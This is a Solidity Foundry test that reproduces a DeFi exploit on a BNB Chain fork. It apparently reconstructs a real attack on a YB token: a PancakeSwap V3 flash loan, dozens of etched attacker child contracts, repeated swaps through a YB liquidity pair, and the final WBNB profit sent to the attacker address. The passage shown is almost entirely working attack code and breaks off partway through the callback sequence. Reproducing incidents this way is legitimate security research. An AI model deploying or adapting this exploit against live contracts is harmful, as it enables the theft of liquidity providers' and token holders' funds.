
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 48415275;
    uint256 constant TX_TIMESTAMP = 1744827689;
    uint256 constant TX_BLOCK_NUMBER = 48415276;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        YvTokenAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _runAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (YvTokenAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = YvTokenAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new YvTokenAttack();
        }
        _etchChildRuntimes();
        _bindAttackChild(attack, Addresses.attack_child);
    }

    function _prepareProfit(YvTokenAttack attack) internal {
        _prepareProfit(address(attack), Addresses.attack_child);
    }

    function _runAttack(YvTokenAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(YvTokenAttack).runtimeCode);
    }

    function _etchChildRuntimes() internal {

        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_D772, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_BA0E, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_20CA, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_125F, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_AA0C, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_61D7, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_B367, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_1DDE, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_1B19, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_07A8, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_C6DD, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_2156, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_E2AC, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_680E, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_58C2, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_B529, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_D77B, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_EA30, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_87C1, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_31E3, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_C533, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_5A7A, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_4632, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_691D, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_71EF, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_A69D, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_6B79, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_6767, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_2099, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_AAE5, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_B261, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_0411, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_6057, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_265C, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_461E, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_1A2A, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_C44D, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_A6FA, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_5D54, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_79BC, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_C701, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_59F6, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_FF38, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_ED2C, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_B752, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_030D, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_5D8E, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_36D4, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_9F3F, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_231E, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_C8EF, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_AE9F, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_E854, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_38C7, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_B881, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_CA02, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_3A78, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_8793, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_C9E0, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_9F0D, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_3D7E, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_D42E, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_FC22, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_9773, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_79D7, type(AttackChild).runtimeCode);
    }

    function _bindAttackChild(YvTokenAttack attack, address attackChildAddress) internal {
        attack.bindAttackChild(attackChildAddress);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WBNB, "WBNB", 26229577432433534433);
        _expectProfit(Addresses.attack_child_1B19, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_07A8, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_C6DD, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_2156, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_E2AC, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_680E, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_58C2, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_B529, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_D77B, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_EA30, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_87C1, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_31E3, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_C533, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_5A7A, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_4632, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_691D, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_71EF, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_A69D, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_6B79, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_6767, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_2099, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_AAE5, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_B261, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.A_81E190_B5EC, address(0), Addresses.YB, "YB", 5822642948478044887);
        _expectProfit(Addresses.A_81E190_B5EC, address(0), Addresses.USDT, "USDT", 3510791577415400038496);
        _expectProfit(Addresses.attack_child_0411, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_6057, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_265C, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_461E, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_1A2A, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_C44D, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_A6FA, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_5D54, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_79BC, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_C701, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_59F6, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_FF38, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_ED2C, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_B752, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_030D, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_5D8E, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_contract, attack, Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_36D4, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_9F3F, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_231E, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_C8EF, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_AE9F, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_E854, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_38C7, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_B881, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_CA02, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_3A78, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_8793, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_C9E0, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_9F0D, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_3D7E, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_D42E, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_FC22, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_9773, address(0), Addresses.YB, "YB", 3000000);
        _expectProfit(Addresses.attack_child_79D7, address(0), Addresses.YB, "YB", 3000000);
    }
}

contract YvTokenAttack {
    AttackChild public attackChild;

    function attack() external payable {
        _startFlashLoan();
    }

    function _startFlashLoan() internal {
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
        IERC20Like(Addresses.USDT).balanceOf(Addresses.A_D5F056_F92F);
        IPancakeV3Factory(Addresses.PancakeV3Factory)
            .getPool(Addresses.USDT, Addresses.WBNB, uint24(500));
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool);
        {
            bytes memory flashCallbackData =
                hex"00000000000000000000000036696169c63e42cd08ce11f5deebbcebae65205000000000000000000000000055d398326f99059ff775485246999027b3197955000000000000000000000000000000000000000000000410d586a20a4c00000000000000000000000000000038231f8eb79208192054be60cb5965e34668350a00000000000000000000000055d398326f99059ff775485246999027b319795500000000000000000000000004227350eda8cb8b1cfb84c727906cb3ccbff54700000000000000000000000055d398326f99059ff775485246999027b3197955000000000000000000000000000000000000000000000000000000000000004200000000000000000000000000000000000000000000000000000000000026f7";
            IPancakeV3Pool(Addresses.PancakeV3Pool)
                .flash(address(this), 19200000000000000000000, 0, flashCallbackData);
        }
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        IPancakeRouter(Addresses.PancakeRouter).factory();
        IPancakeFactory(Addresses.PancakeFactory).getPair(Addresses.USDT, Addresses.WBNB);
        IERC20Like(Addresses.USDT).allowance(address(this), Addresses.PancakeRouter);
        {
            uint256 routerSwapAmountIn = 15261682404131219647070;
            if (routerSwapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.USDT).allowance(address(this), Addresses.PancakeRouter)
                        < routerSwapAmountIn
                ) {
                    IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        routerSwapAmountIn,
                        0,
                        _addressArray2(Addresses.USDT, Addresses.WBNB),
                        address(this),
                        1744827689
                    );
            }
        }
        uint256 wbnbProfit = IERC20Like(Addresses.WBNB).balanceOf(address(this));
        IERC20Like(Addresses.WBNB).transfer(Addresses.attacker_eoa, wbnbProfit);
    }

    function flashCallback() internal {
        flashFlowStarted = true;
        flashCallback2();
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
        flashCallback12();
        flashCallback13();
        flashCallback14();
        flashCallback15();
        flashCallback16();
        flashCallback17();
        flashCallback18();
        flashCallback19();
        flashCallback20();
        flashCallback21();
        flashCallback22();
        flashCallback23();
        flashCallback24();
        flashCallback25();
        flashCallback26();
        flashCallback27();
        flashCallback28();
        flashCallback29();
        flashCallback30();
        flashCallback31();
        flashCallback32();
        flashCallback33();
        flashCallback34();
        flashCallback35();
        flashCallback36();
        flashCallback37();
        flashCallback38();
        flashCallback39();
        flashCallback40();
        flashCallback41();
        flashCallback42();
        flashCallback43();
        flashCallback44();
        flashCallback45();
        flashCallback46();
        flashCallback47();
        flashCallback48();
    }

    function _pullChildYb(address attackChildAddress) internal {
        uint256 childYbBalance = IERC20Like(Addresses.YB).balanceOf(attackChildAddress);
        IERC20Like(Addresses.YB).transferFrom(attackChildAddress, address(this), childYbBalance);
    }

    function flashCallback2() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        {
            address created = Addresses.attack_child_AE9F;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_AE9F)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(4804355363583104569, 0, Addresses.attack_child_AE9F, hex"");
        _pullChildYb(Addresses.attack_child_AE9F);
        {
            address created = Addresses.attack_child_0411;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_0411)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(4648785816183568909, 0, Addresses.attack_child_0411, hex"");
        _pullChildYb(Addresses.attack_child_0411);
        {
            address created = Addresses.attack_child_EA30;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_EA30)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(4500655065299136771, 0, Addresses.attack_child_EA30, hex"");
        _pullChildYb(Addresses.attack_child_EA30);
        {
            address created = Addresses.attack_child_B261;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_B261)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(4359496197031256368, 0, Addresses.attack_child_B261, hex"");
        _pullChildYb(Addresses.attack_child_B261);
        {
            address created = Addresses.attack_child_A6FA;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_A6FA)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(4224878369387439208, 0, Addresses.attack_child_A6FA, hex"");
        IERC20Like(Addresses.YB).balanceOf(Addresses.attack_child_A6FA);
    }

    function flashCallback4() internal {
        IERC20Like(Addresses.YB).transferFrom(Addresses.attack_child_A6FA, address(this), 4013634450918067248);
        {
            address created = Addresses.attack_child_07A8;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_07A8)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(4096403518790337417, 0, Addresses.attack_child_07A8, hex"");
        _pullChildYb(Addresses.attack_child_07A8);
        {
            address created = Addresses.attack_child_CA02;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_CA02)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(3973703412171754005, 0, Addresses.attack_child_CA02, hex"");
        _pullChildYb(Addresses.attack_child_CA02);
        {
            address created = Addresses.attack_child_AAE5;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_AAE5)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
    }

    function flashCallback5() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(3856437003819606555, 0, Addresses.attack_child_AAE5, hex"");
        _pullChildYb(Addresses.attack_child_AAE5);
        {
            address created = Addresses.attack_child_6057;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_6057)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(3744288061494518062, 0, Addresses.attack_child_6057, hex"");
        _pullChildYb(Addresses.attack_child_6057);
        {
            address created = Addresses.attack_child_FF38;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_FF38)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(3636963030914034271, 0, Addresses.attack_child_FF38, hex"");
        IERC20Like(Addresses.YB).balanceOf(Addresses.attack_child_FF38);
    }

    function flashCallback6() internal {
        IERC20Like(Addresses.YB).transferFrom(Addresses.attack_child_FF38, address(this), 3455114879368332558);
        {
            address created = Addresses.attack_child_D77B;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_D77B)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(3534189111635844953, 0, Addresses.attack_child_D77B, hex"");
        _pullChildYb(Addresses.attack_child_D77B);
        {
            address created = Addresses.attack_child_BA0E;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_BA0E)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(3435712520756218083, 0, Addresses.attack_child_BA0E, hex"");
        _pullChildYb(Addresses.attack_child_BA0E);
        {
            address created = Addresses.attack_child_58C2;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_58C2)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
    }

    function flashCallback7() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(3341296923759134905, 0, Addresses.attack_child_58C2, hex"");
        _pullChildYb(Addresses.attack_child_58C2);
        {
            address created = Addresses.attack_child_6B79;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_6B79)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(3250722014374821939, 0, Addresses.attack_child_6B79, hex"");
        _pullChildYb(Addresses.attack_child_6B79);
        {
            address created = Addresses.attack_child_1DDE;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_1DDE)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(3163782227491833149, 0, Addresses.attack_child_1DDE, hex"");
        IERC20Like(Addresses.YB).balanceOf(Addresses.attack_child_1DDE);
    }

    function flashCallback8() internal {
        IERC20Like(Addresses.YB).transferFrom(Addresses.attack_child_1DDE, address(this), 3005593116117241492);
        {
            address created = Addresses.attack_child_B881;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_B881)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(3080285571063617565, 0, Addresses.attack_child_B881, hex"");
        _pullChildYb(Addresses.attack_child_B881);
        {
            address created = Addresses.attack_child_D772;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_D772)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(3000052564600012407, 0, Addresses.attack_child_D772, hex"");
        _pullChildYb(Addresses.attack_child_D772);
        {
            address created = Addresses.attack_child_9773;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_9773)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
    }

    function flashCallback9() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2922915273271334085, 0, Addresses.attack_child_9773, hex"");
        _pullChildYb(Addresses.attack_child_9773);
        {
            address created = Addresses.attack_child_680E;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_680E)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2848716427907366796, 0, Addresses.attack_child_680E, hex"");
        _pullChildYb(Addresses.attack_child_680E);
        {
            address created = Addresses.attack_child_231E;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_231E)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2777308622270771797, 0, Addresses.attack_child_231E, hex"");
        IERC20Like(Addresses.YB).balanceOf(Addresses.attack_child_231E);
    }

    function flashCallback10() internal {
        IERC20Like(Addresses.YB).transferFrom(Addresses.attack_child_231E, address(this), 2638443191157233208);
        {
            address created = Addresses.attack_child_61D7;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_61D7)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2708553579945713449, 0, Addresses.attack_child_61D7, hex"");
        _pullChildYb(Addresses.attack_child_61D7);
        {
            address created = Addresses.attack_child_2099;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_2099)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2642321484026123816, 0, Addresses.attack_child_2099, hex"");
        _pullChildYb(Addresses.attack_child_2099);
        {
            address created = Addresses.attack_child_C533;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_C533)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
    }

    function flashCallback11() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2578490363529652939, 0, Addresses.attack_child_C533, hex"");
        _pullChildYb(Addresses.attack_child_C533);
        {
            address created = Addresses.attack_child_C44D;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_C44D)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2516945531116381075, 0, Addresses.attack_child_C44D, hex"");
        _pullChildYb(Addresses.attack_child_C44D);
        {
            address created = Addresses.attack_child_2156;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_2156)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
